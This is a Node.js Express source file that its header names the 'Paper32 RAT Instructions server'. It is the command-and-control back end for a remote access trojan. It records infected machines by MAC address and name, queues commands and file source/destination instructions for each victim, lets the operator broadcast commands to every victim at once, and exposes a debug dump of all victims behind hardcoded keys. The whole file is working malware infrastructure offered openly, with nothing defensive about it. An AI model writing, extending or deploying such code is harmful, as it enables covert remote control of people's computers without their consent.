/*  Paper32 RAT Instructions server

    Yeah I know it's bad to put logic in index.js but I don't care
    SEE LICENSE FOR COPYRIGHT */


const express = require('express');
const bodyParser = require('body-parser');
const app = new express();


const adminkey = 'adminkey';
const userkey = 'azertyuiop';


// Body parser things
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

let instructions = {};

// STATIC SERVING

app.use('/static', express.static('./static'));

// USER END ENDPOINTS -- BEGIN

app.trace('/users/:mac/trace/:user/:version/do', (req, res) => {
  console.log(req.params.user + ' and mac ' + req.params.mac + ' with version ' + req.params.version);
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the TRACE request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
  }
  instructions[req.params.mac].lastTrace = new Date().toISOString();
  instructions[req.params.mac].machineName = req.params.user;
  instructions[req.params.mac].version = req.params.version;
  res.status(200);
  res.end();
})

app.get('/users/:mac/last', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== userkey && req.headers.authorization !== adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the GET request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
  }
  if (instructions[req.params.mac].arr.length === 0) {
    // Asking for instructions, while not pending
    res.status(200);
    res.end('no-entry');
    return;
  }
  //Building instructions, maybe change how it works to use CRLF
  let r = '';
  if (instructions[req.params.mac].arr[0].it) {
    r += 'Instruction-Type: ' + instructions[req.params.mac].arr[0].it + ';;;;';
  }
  if (instructions[req.params.mac].arr[0].source) {
    r += 'Source: ' + instructions[req.params.mac].arr[0].source + ';;;;';
  }
  if (instructions[req.params.mac].arr[0].dest) {
    r += 'Destination: ' + instructions[req.params.mac].arr[0].dest + ';;;;';
  }
  if (instructions[req.params.mac].arr[0].command) {
    r += 'Command: ' + instructions[req.params.mac].arr[0].command + ';;;;';
  }
  res.status(200);
  res.end(r);
});

app.delete('/users/:mac/done', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== userkey && req.headers.authorization !== adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the DELETE request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
  }
  if (instructions[req.params.mac].arr.length === 0) {
    // Instructions list already empty, ignore
    res.status(200);
    res.end();
    return;
  }
  // Shift instructions
  instructions[req.params.mac].arr.shift();
  res.status(200);
  res.end();
});

// USER END ENDPOINTS -- END

// ADMIN END ENDPOINTS -- BEGIN

app.post('/users/:mac/admin/add', (req, res) => {
  // This endpoint is for adding instructions for a particular MAC
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!req.body.it) {
    res.status(403);
    res.end('Forbidden, please add a valid JSON body');
    return;
  }
  if (!instructions[req.params.mac]) {
    // Not yet registered in instructions, creating instance
    console.log('An user has been registered for the first time, in the admin POST request');
    instructions[req.params.mac] = {};
    instructions[req.params.mac].arr = [];
    // Not return this time
  }
  instructions[req.params.mac].arr.push(JSON.parse(JSON.stringify(req.body)));
  res.status(200);
  res.end();
});

app.get('/admin/debug', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  res.json(instructions);
});

app.post('/admin/broadcast', (req, res) => {
  if (!req.headers.authorization) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (req.headers.authorization !== adminkey) {
    // Not authorized
    res.status(401);
    res.end('Error 401');
    return;
  }
  if (!req.body.it) {
    res.status(403);
    res.end('Forbidden, please add a valid JSON body');
    return;
  }
  Object.keys(instructions).forEach(key => {
    instructions[key].arr.push(JSON.parse(JSON.stringify(req.body)));
  });
  res.status(200);
  res.end();
});

// ADMIN END ENDPOINTS -- END

app.use((req, res) => {
  // 404 fallback
  res.status(404);
  res.end('Error 404');
});

app.listen(9033);